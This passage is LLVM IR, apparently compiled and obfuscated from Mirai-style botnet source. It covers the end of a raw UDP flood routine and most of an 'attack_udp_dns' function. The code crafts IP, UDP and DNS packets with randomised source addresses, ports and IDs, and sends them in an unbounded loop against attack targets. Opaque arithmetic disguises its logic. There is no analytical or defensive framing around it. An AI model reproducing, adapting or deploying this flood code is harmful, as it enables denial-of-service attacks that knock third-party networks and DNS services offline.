  %132 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %131, i32 0, i32 2
  store i16 %130, i16* %132, align 2
  %133 = load i16, i16* %13, align 2
  %134 = call zeroext i16 @htons(i16 zeroext %133) #7
  %135 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %136 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %135, i32 0, i32 3
  store i16 %134, i16* %136, align 4
  %137 = load i8, i8* %14, align 1
  %138 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %139 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %138, i32 0, i32 5
  store i8 %137, i8* %139, align 4
  %140 = load i8, i8* %15, align 1
  %141 = icmp ne i8 %140, 0
  br i1 %141, label %142, label %146

; <label>:142:                                    ; preds = %73
  %143 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %144 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %145 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %144, i32 0, i32 4
  store i16 %143, i16* %145, align 2
  br label %146

; <label>:146:                                    ; preds = %142, %73
  %147 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 6
  store i8 17, i8* %148, align 1
  %149 = load i32, i32* @LOCAL_ADDR, align 4
  %150 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 8
  store i32 %149, i32* %151, align 4
  %152 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %153 = load i32, i32* %9, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %152, i64 %154
  %156 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %155, i32 0, i32 1
  %157 = load i32, i32* %156, align 4
  %158 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %159 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %158, i32 0, i32 9
  store i32 %157, i32* %159, align 4
  %160 = load i16, i16* %16, align 2
  %161 = call zeroext i16 @htons(i16 zeroext %160) #7
  %162 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %163 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %162, i32 0, i32 0
  store i16 %161, i16* %163, align 2
  %164 = load i16, i16* %17, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %164) #7
  %166 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %167 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %166, i32 0, i32 1
  store i16 %165, i16* %167, align 2
  %168 = load i32, i32* %19, align 4
  %169 = sext i32 %168 to i64
  %170 = add i64 12, -8360745370831648143
  %171 = add i64 %170, %169
  %172 = sub i64 %171, -8360745370831648143
  %173 = add i64 12, %169
  %174 = trunc i64 %172 to i16
  %175 = call zeroext i16 @htons(i16 zeroext %174) #7
  %176 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %177 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %176, i32 0, i32 2
  store i16 %175, i16* %177, align 2
  %178 = load i8*, i8** %22, align 8
  %179 = bitcast i8* %178 to i32*
  store i32 -1, i32* %179, align 4
  %180 = load i8*, i8** %22, align 8
  %181 = getelementptr inbounds i8, i8* %180, i64 4
  store i8* %181, i8** %22, align 8
  %182 = load i8*, i8** %22, align 8
  %183 = load i8*, i8** %18, align 8
  %184 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %182, i8* %183, i32 %184)
  br label %185

; <label>:185:                                    ; preds = %146
  %186 = load i32, i32* %9, align 4
  %187 = sub i32 %186, 1367278130
  %188 = add i32 %187, 1
  %189 = add i32 %188, 1367278130
  %190 = add nsw i32 %186, 1
  store i32 %189, i32* %9, align 4
  br label %68

; <label>:191:                                    ; preds = %68
  br label %192

; <label>:192:                                    ; preds = %327, %191
  store i32 0, i32* %9, align 4
  br label %193

; <label>:193:                                    ; preds = %321, %192
  %194 = load i32, i32* %9, align 4
  %195 = load i8, i8* %5, align 1
  %196 = zext i8 %195 to i32
  %197 = icmp slt i32 %194, %196
  br i1 %197, label %198, label %327

; <label>:198:                                    ; preds = %193
  %199 = load i8**, i8*** %11, align 8
  %200 = load i32, i32* %9, align 4
  %201 = sext i32 %200 to i64
  %202 = getelementptr inbounds i8*, i8** %199, i64 %201
  %203 = load i8*, i8** %202, align 8
  store i8* %203, i8** %23, align 8
  %204 = load i8*, i8** %23, align 8
  %205 = bitcast i8* %204 to %struct.iphdr*
  store %struct.iphdr* %205, %struct.iphdr** %24, align 8
  %206 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %207 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %206, i64 1
  %208 = bitcast %struct.iphdr* %207 to %struct.udphdr*
  store %struct.udphdr* %208, %struct.udphdr** %25, align 8
  %209 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %210 = load i32, i32* %9, align 4
  %211 = sext i32 %210 to i64
  %212 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %209, i64 %211
  %213 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %212, i32 0, i32 2
  %214 = load i8, i8* %213, align 4
  %215 = zext i8 %214 to i32
  %216 = icmp slt i32 %215, 32
  br i1 %216, label %217, label %241

; <label>:217:                                    ; preds = %198
  %218 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %219 = load i32, i32* %9, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %218, i64 %220
  %222 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %221, i32 0, i32 1
  %223 = load i32, i32* %222, align 4
  %224 = call i32 @ntohl(i32 %223) #7
  %225 = call i32 @rand_next()
  %226 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %227 = load i32, i32* %9, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %226, i64 %228
  %230 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %229, i32 0, i32 2
  %231 = load i8, i8* %230, align 4
  %232 = zext i8 %231 to i32
  %233 = lshr i32 %225, %232
  %234 = sub i32 %224, 1868625035
  %235 = add i32 %234, %233
  %236 = add i32 %235, 1868625035
  %237 = add i32 %224, %233
  %238 = call i32 @htonl(i32 %236) #7
  %239 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %240 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %239, i32 0, i32 9
  store i32 %238, i32* %240, align 4
  br label %241

; <label>:241:                                    ; preds = %217, %198
  %242 = load i16, i16* %13, align 2
  %243 = zext i16 %242 to i32
  %244 = icmp eq i32 %243, 65535
  br i1 %244, label %245, label %250

; <label>:245:                                    ; preds = %241
  %246 = call i32 @rand_next()
  %247 = trunc i32 %246 to i16
  %248 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %249 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %248, i32 0, i32 3
  store i16 %247, i16* %249, align 4
  br label %250

; <label>:250:                                    ; preds = %245, %241
  %251 = load i16, i16* %16, align 2
  %252 = zext i16 %251 to i32
  %253 = icmp eq i32 %252, 65535
  br i1 %253, label %254, label %259

; <label>:254:                                    ; preds = %250
  %255 = call i32 @rand_next()
  %256 = trunc i32 %255 to i16
  %257 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %258 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %257, i32 0, i32 0
  store i16 %256, i16* %258, align 2
  br label %259

; <label>:259:                                    ; preds = %254, %250
  %260 = load i16, i16* %17, align 2
  %261 = zext i16 %260 to i32
  %262 = icmp eq i32 %261, 65535
  br i1 %262, label %263, label %268

; <label>:263:                                    ; preds = %259
  %264 = call i32 @rand_next()
  %265 = trunc i32 %264 to i16
  %266 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %267 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %266, i32 0, i32 1
  store i16 %265, i16* %267, align 2
  br label %268

; <label>:268:                                    ; preds = %263, %259
  %269 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 7
  store i16 0, i16* %270, align 2
  %271 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %272 = bitcast %struct.iphdr* %271 to i16*
  %273 = call zeroext i16 @checksum_generic(i16* %272, i32 20)
  %274 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 7
  store i16 %273, i16* %275, align 2
  %276 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %277 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %276, i32 0, i32 3
  store i16 0, i16* %277, align 2
  %278 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %279 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %280 = bitcast %struct.udphdr* %279 to i8*
  %281 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %282 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %281, i32 0, i32 2
  %283 = load i16, i16* %282, align 2
  %284 = load i32, i32* %19, align 4
  %285 = sext i32 %284 to i64
  %286 = sub i64 0, 12
  %287 = sub i64 0, %285
  %288 = add i64 %286, %287
  %289 = sub i64 0, %288
  %290 = add i64 12, %285
  %291 = trunc i64 %289 to i32
  %292 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %278, i8* %280, i16 zeroext %283, i32 %291)
  %293 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %294 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %293, i32 0, i32 3
  store i16 %292, i16* %294, align 2
  %295 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %296 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %295, i32 0, i32 1
  %297 = load i16, i16* %296, align 2
  %298 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %299 = load i32, i32* %9, align 4
  %300 = sext i32 %299 to i64
  %301 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %298, i64 %300
  %302 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %301, i32 0, i32 0
  %303 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %302, i32 0, i32 1
  store i16 %297, i16* %303, align 2
  %304 = load i32, i32* %10, align 4
  %305 = load i8*, i8** %23, align 8
  %306 = load i32, i32* %19, align 4
  %307 = sext i32 %306 to i64
  %308 = sub i64 0, %307
  %309 = sub i64 32, %308
  %310 = add i64 32, %307
  %311 = bitcast %union.__CONST_SOCKADDR_ARG* %26 to %struct.sockaddr**
  %312 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %313 = load i32, i32* %9, align 4
  %314 = sext i32 %313 to i64
  %315 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %312, i64 %314
  %316 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %315, i32 0, i32 0
  %317 = bitcast %struct.sockaddr_in* %316 to %struct.sockaddr*
  store %struct.sockaddr* %317, %struct.sockaddr** %311, align 8
  %318 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %26, i32 0, i32 0
  %319 = load %struct.sockaddr*, %struct.sockaddr** %318, align 8
  %320 = call i64 @sendto(i32 %304, i8* %305, i64 %309, i32 16384, %struct.sockaddr* %319, i32 16)
  br label %321

; <label>:321:                                    ; preds = %268
  %322 = load i32, i32* %9, align 4
  %323 = sub i32 %322, 1241308495
  %324 = add i32 %323, 1
  %325 = add i32 %324, 1241308495
  %326 = add nsw i32 %322, 1
  store i32 %325, i32* %9, align 4
  br label %193

; <label>:327:                                    ; preds = %193
  br label %192

; <label>:328:                                    ; preds = %64, %58
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_udp_dns(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i16, align 2
  %19 = alloca i8, align 1
  %20 = alloca i8*, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i32, align 4
  %24 = alloca i8, align 1
  %25 = alloca i8, align 1
  %26 = alloca %struct.iphdr*, align 8
  %27 = alloca %struct.udphdr*, align 8
  %28 = alloca %struct.dnshdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca i8*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca i8*, align 8
  %33 = alloca %struct.iphdr*, align 8
  %34 = alloca %struct.udphdr*, align 8
  %35 = alloca %struct.dnshdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %38 = load i8, i8* %5, align 1
  %39 = zext i8 %38 to i64
  %40 = call noalias i8* @calloc(i64 %39, i64 8) #6
  %41 = bitcast i8* %40 to i8**
  store i8** %41, i8*** %11, align 8
  %42 = load i8, i8* %7, align 1
  %43 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %44 = call i32 @attack_get_opt_int(i8 zeroext %42, %struct.attack_option* %43, i8 zeroext 2, i32 0)
  %45 = trunc i32 %44 to i8
  store i8 %45, i8* %12, align 1
  %46 = load i8, i8* %7, align 1
  %47 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %48 = call i32 @attack_get_opt_int(i8 zeroext %46, %struct.attack_option* %47, i8 zeroext 3, i32 65535)
  %49 = trunc i32 %48 to i16
  store i16 %49, i16* %13, align 2
  %50 = load i8, i8* %7, align 1
  %51 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %52 = call i32 @attack_get_opt_int(i8 zeroext %50, %struct.attack_option* %51, i8 zeroext 4, i32 64)
  %53 = trunc i32 %52 to i8
  store i8 %53, i8* %14, align 1
  %54 = load i8, i8* %7, align 1
  %55 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %56 = call i32 @attack_get_opt_int(i8 zeroext %54, %struct.attack_option* %55, i8 zeroext 5, i32 0)
  %57 = trunc i32 %56 to i8
  store i8 %57, i8* %15, align 1
  %58 = load i8, i8* %7, align 1
  %59 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %60 = call i32 @attack_get_opt_int(i8 zeroext %58, %struct.attack_option* %59, i8 zeroext 6, i32 65535)
  %61 = trunc i32 %60 to i16
  store i16 %61, i16* %16, align 2
  %62 = load i8, i8* %7, align 1
  %63 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %64 = call i32 @attack_get_opt_int(i8 zeroext %62, %struct.attack_option* %63, i8 zeroext 7, i32 53)
  %65 = trunc i32 %64 to i16
  store i16 %65, i16* %17, align 2
  %66 = load i8, i8* %7, align 1
  %67 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %68 = call i32 @attack_get_opt_int(i8 zeroext %66, %struct.attack_option* %67, i8 zeroext 9, i32 65535)
  %69 = trunc i32 %68 to i16
  store i16 %69, i16* %18, align 2
  %70 = load i8, i8* %7, align 1
  %71 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %72 = call i32 @attack_get_opt_int(i8 zeroext %70, %struct.attack_option* %71, i8 zeroext 0, i32 12)
  %73 = trunc i32 %72 to i8
  store i8 %73, i8* %19, align 1
  %74 = load i8, i8* %7, align 1
  %75 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %76 = call i8* @attack_get_opt_str(i8 zeroext %74, %struct.attack_option* %75, i8 zeroext 8, i8* null)
  store i8* %76, i8** %20, align 8
  %77 = call i32 @get_dns_resolver()
  store i32 %77, i32* %22, align 4
  %78 = load i8*, i8** %20, align 8
  %79 = icmp eq i8* %78, null
  br i1 %79, label %80, label %81

; <label>:80:                                     ; preds = %4
  br label %517

; <label>:81:                                     ; preds = %4
  %82 = load i8*, i8** %20, align 8
  %83 = call i32 @util_strlen(i8* %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %81
  br label %517

; <label>:87:                                     ; preds = %81
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 %93)
  br label %517

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %335, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %340

; <label>:101:                                    ; preds = %96
  store i8 0, i8* %24, align 1
  store i8 0, i8* %25, align 1
  %102 = call noalias i8* @calloc(i64 600, i64 1) #6
  %103 = load i8**, i8*** %11, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %26, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.udphdr*
  store %struct.udphdr* %115, %struct.udphdr** %27, align 8
  %116 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %117 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %116, i64 1
  %118 = bitcast %struct.udphdr* %117 to %struct.dnshdr*
  store %struct.dnshdr* %118, %struct.dnshdr** %28, align 8
  %119 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %120 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %119, i64 1
  %121 = bitcast %struct.dnshdr* %120 to i8*
  store i8* %121, i8** %29, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %123 = bitcast %struct.iphdr* %122 to i8*
  %124 = load i8, i8* %123, align 4
  %125 = xor i8 %124, -1
  %126 = xor i8 15, -1
  %127 = xor i8 -45, -1
  %128 = or i8 %125, %126
  %129 = or i8 -45, %127
  %130 = xor i8 %128, -1
  %131 = and i8 %130, %129
  %132 = and i8 %124, 15
  %133 = xor i8 %131, -1
  %134 = xor i8 64, -1
  %135 = xor i8 21, -1
  %136 = and i8 %133, 21
  %137 = and i8 %131, %135
  %138 = and i8 %134, 21
  %139 = and i8 64, %135
  %140 = or i8 %136, %137
  %141 = or i8 %138, %139
  %142 = xor i8 %140, %141
  %143 = or i8 %133, %134
  %144 = xor i8 %143, -1
  %145 = or i8 21, %135
  %146 = and i8 %144, %145
  %147 = or i8 %142, %146
  %148 = or i8 %131, 64
  store i8 %147, i8* %123, align 4
  %149 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %150 = bitcast %struct.iphdr* %149 to i8*
  %151 = load i8, i8* %150, align 4
  %152 = xor i8 -16, -1
  %153 = xor i8 %151, %152
  %154 = and i8 %153, %151
  %155 = and i8 %151, -16
  %156 = xor i8 %154, -1
  %157 = xor i8 5, -1
  %158 = xor i8 -23, -1
  %159 = and i8 %156, -23
  %160 = and i8 %154, %158
  %161 = and i8 %157, -23
  %162 = and i8 5, %158
  %163 = or i8 %159, %160
  %164 = or i8 %161, %162
  %165 = xor i8 %163, %164
  %166 = or i8 %156, %157
  %167 = xor i8 %166, -1
  %168 = or i8 -23, %158
  %169 = and i8 %167, %168
  %170 = or i8 %165, %169
  %171 = or i8 %154, 5
  store i8 %170, i8* %150, align 4
  %172 = load i8, i8* %12, align 1
  %173 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 1
  store i8 %172, i8* %174, align 1
  %175 = load i8, i8* %19, align 1
  %176 = zext i8 %175 to i64
  %177 = sub i64 41, -1469719110058834359
  %178 = add i64 %177, %176
  %179 = add i64 %178, -1469719110058834359
  %180 = add i64 41, %176
  %181 = sub i64 0, %179
  %182 = sub i64 0, 2
  %183 = add i64 %181, %182
  %184 = sub i64 0, %183
  %185 = add i64 %179, 2
  %186 = load i32, i32* %21, align 4
  %187 = sext i32 %186 to i64
  %188 = add i64 %184, -5231567139170521005
  %189 = add i64 %188, %187
  %190 = sub i64 %189, -5231567139170521005
  %191 = add i64 %184, %187
  %192 = sub i64 %190, -3426917637334756466
  %193 = add i64 %192, 4
  %194 = add i64 %193, -3426917637334756466
  %195 = add i64 %190, 4
  %196 = trunc i64 %194 to i16
  %197 = call zeroext i16 @htons(i16 zeroext %196) #7
  %198 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 2
  store i16 %197, i16* %199, align 2
  %200 = load i16, i16* %13, align 2
  %201 = call zeroext i16 @htons(i16 zeroext %200) #7
  %202 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %203 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %202, i32 0, i32 3
  store i16 %201, i16* %203, align 4
  %204 = load i8, i8* %14, align 1
  %205 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %206 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %205, i32 0, i32 5
  store i8 %204, i8* %206, align 4
  %207 = load i8, i8* %15, align 1
  %208 = icmp ne i8 %207, 0
  br i1 %208, label %209, label %213

; <label>:209:                                    ; preds = %101
  %210 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %211 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i32 0, i32 4
  store i16 %210, i16* %212, align 2
  br label %213

; <label>:213:                                    ; preds = %209, %101
  %214 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %215 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %214, i32 0, i32 6
  store i8 17, i8* %215, align 1
  %216 = load i32, i32* @LOCAL_ADDR, align 4
  %217 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %218 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %217, i32 0, i32 8
  store i32 %216, i32* %218, align 4
  %219 = load i32, i32* %22, align 4
  %220 = load %struct.iphdr*, %struct.iphdr** %26, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 9
  store i32 %219, i32* %221, align 4
  %222 = load i16, i16* %16, align 2
  %223 = call zeroext i16 @htons(i16 zeroext %222) #7
  %224 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %225 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %224, i32 0, i32 0
  store i16 %223, i16* %225, align 2
  %226 = load i16, i16* %17, align 2
  %227 = call zeroext i16 @htons(i16 zeroext %226) #7
  %228 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %229 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %228, i32 0, i32 1
  store i16 %227, i16* %229, align 2
  %230 = load i8, i8* %19, align 1
  %231 = zext i8 %230 to i64
  %232 = sub i64 0, 21
  %233 = sub i64 0, %231
  %234 = add i64 %232, %233
  %235 = sub i64 0, %234
  %236 = add i64 21, %231
  %237 = sub i64 0, 2
  %238 = sub i64 %235, %237
  %239 = add i64 %235, 2
  %240 = load i32, i32* %21, align 4
  %241 = sext i32 %240 to i64
  %242 = sub i64 %238, 4510869803282191693
  %243 = add i64 %242, %241
  %244 = add i64 %243, 4510869803282191693
  %245 = add i64 %238, %241
  %246 = add i64 %244, 6493358224942117206
  %247 = add i64 %246, 4
  %248 = sub i64 %247, 6493358224942117206
  %249 = add i64 %244, 4
  %250 = trunc i64 %248 to i16
  %251 = call zeroext i16 @htons(i16 zeroext %250) #7
  %252 = load %struct.udphdr*, %struct.udphdr** %27, align 8
  %253 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %252, i32 0, i32 2
  store i16 %251, i16* %253, align 2
  %254 = load i16, i16* %18, align 2
  %255 = call zeroext i16 @htons(i16 zeroext %254) #7
  %256 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %257 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %256, i32 0, i32 0
  store i16 %255, i16* %257, align 2
  %258 = call zeroext i16 @htons(i16 zeroext 256) #7
  %259 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %260 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %259, i32 0, i32 1
  store i16 %258, i16* %260, align 2
  %261 = call zeroext i16 @htons(i16 zeroext 1) #7
  %262 = load %struct.dnshdr*, %struct.dnshdr** %28, align 8
  %263 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %262, i32 0, i32 2
  store i16 %261, i16* %263, align 2
  %264 = load i8, i8* %19, align 1
  %265 = load i8*, i8** %29, align 8
  %266 = getelementptr inbounds i8, i8* %265, i32 1
  store i8* %266, i8** %29, align 8
  store i8 %264, i8* %265, align 1
  %267 = load i8, i8* %19, align 1
  %268 = zext i8 %267 to i32
  %269 = load i8*, i8** %29, align 8
  %270 = sext i32 %268 to i64
  %271 = getelementptr inbounds i8, i8* %269, i64 %270
  store i8* %271, i8** %29, align 8
  %272 = load i8*, i8** %29, align 8
  store i8* %272, i8** %30, align 8
  %273 = load i8*, i8** %29, align 8
  %274 = getelementptr inbounds i8, i8* %273, i64 1
  %275 = load i8*, i8** %20, align 8
  %276 = load i32, i32* %21, align 4
  %277 = sub i32 0, 1
  %278 = sub i32 %276, %277
  %279 = add nsw i32 %276, 1
  call void @util_memcpy(i8* %274, i8* %275, i32 %278)
  store i32 0, i32* %23, align 4
  br label %280

; <label>:280:                                    ; preds = %313, %213
  %281 = load i32, i32* %23, align 4
  %282 = load i32, i32* %21, align 4
  %283 = icmp slt i32 %281, %282
  br i1 %283, label %284, label %320

; <label>:284:                                    ; preds = %280
  %285 = load i8*, i8** %20, align 8
  %286 = load i32, i32* %23, align 4
  %287 = sext i32 %286 to i64
  %288 = getelementptr inbounds i8, i8* %285, i64 %287
  %289 = load i8, i8* %288, align 1
  %290 = sext i8 %289 to i32
  %291 = icmp eq i32 %290, 46
  br i1 %291, label %292, label %306

; <label>:292:                                    ; preds = %284
  %293 = load i8, i8* %24, align 1
  %294 = load i8*, i8** %30, align 8
  store i8 %293, i8* %294, align 1
  store i8 0, i8* %24, align 1
  %295 = load i8, i8* %25, align 1
  %296 = sub i8 0, %295
  %297 = sub i8 0, 1
  %298 = add i8 %296, %297
  %299 = sub i8 0, %298
  %300 = add i8 %295, 1
  store i8 %299, i8* %25, align 1
  %301 = load i8*, i8** %29, align 8
  %302 = load i32, i32* %23, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8, i8* %301, i64 %303
  %305 = getelementptr inbounds i8, i8* %304, i64 1
  store i8* %305, i8** %30, align 8
  br label %312

; <label>:306:                                    ; preds = %284
  %307 = load i8, i8* %24, align 1
  %308 = sub i8 %307, -43
  %309 = add i8 %308, 1
  %310 = add i8 %309, -43
  %311 = add i8 %307, 1
  store i8 %310, i8* %24, align 1
  br label %312

; <label>:312:                                    ; preds = %306, %292
  br label %313

; <label>:313:                                    ; preds = %312
  %314 = load i32, i32* %23, align 4
  %315 = sub i32 0, %314
  %316 = sub i32 0, 1
  %317 = add i32 %315, %316
  %318 = sub i32 0, %317
  %319 = add nsw i32 %314, 1
  store i32 %318, i32* %23, align 4
  br label %280

; <label>:320:                                    ; preds = %280
  %321 = load i8, i8* %24, align 1
  %322 = load i8*, i8** %30, align 8
  store i8 %321, i8* %322, align 1
  %323 = load i8*, i8** %29, align 8
  %324 = load i32, i32* %21, align 4
  %325 = sext i32 %324 to i64
  %326 = getelementptr inbounds i8, i8* %323, i64 %325
  %327 = getelementptr inbounds i8, i8* %326, i64 2
  %328 = bitcast i8* %327 to %struct.grehdr*
  store %struct.grehdr* %328, %struct.grehdr** %31, align 8
  %329 = call zeroext i16 @htons(i16 zeroext 1) #7
  %330 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %331 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %330, i32 0, i32 0
  store i16 %329, i16* %331, align 2
  %332 = call zeroext i16 @htons(i16 zeroext 1) #7
  %333 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %334 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %333, i32 0, i32 1
  store i16 %332, i16* %334, align 2
  br label %335

; <label>:335:                                    ; preds = %320
  %336 = load i32, i32* %9, align 4
  %337 = sub i32 0, 1
  %338 = sub i32 %336, %337
  %339 = add nsw i32 %336, 1
  store i32 %338, i32* %9, align 4
  br label %96

; <label>:340:                                    ; preds = %96
  br label %341

; <label>:341:                                    ; preds = %516, %340
